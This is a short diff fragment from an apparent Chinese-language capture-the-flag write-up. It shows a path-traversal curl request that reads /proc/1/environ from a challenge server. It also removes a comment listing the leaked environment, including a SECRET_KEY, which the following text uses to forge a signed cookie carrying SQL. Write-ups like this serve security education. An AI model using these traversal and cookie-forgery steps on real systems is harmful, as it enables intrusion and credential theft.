@@ -197,9 +197,6 @@ http.HandleFunc("/static/", func(w http.ResponseWriter, r *http.Request) {
 
 ```zsh
 curl -X CONNECT --path-as-is http://dvd.chal.h4ck3r.quest:10001/static/../../proc/1/environ --output challenge_server_env
-
-# 取的內容
-# PATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=9ad75fc686b9 SECRET_KEY=d2908c1de1cd896d90f09df7df67e1d4 GOLANG_VERSION=1.17.2 GOPATH=/go HOME=/root 
 ```
 
 第二步，利用取得的 `SECRET_KEY=d2908c1de1cd896d90f09df7df67e1d4` 自行簽章包含 Sql 語法的 Cookie (因為一開始還在測試階段，我把簽章程式寫成 Server 模式方便試驗成果以及接下來的 Automation 整合)：
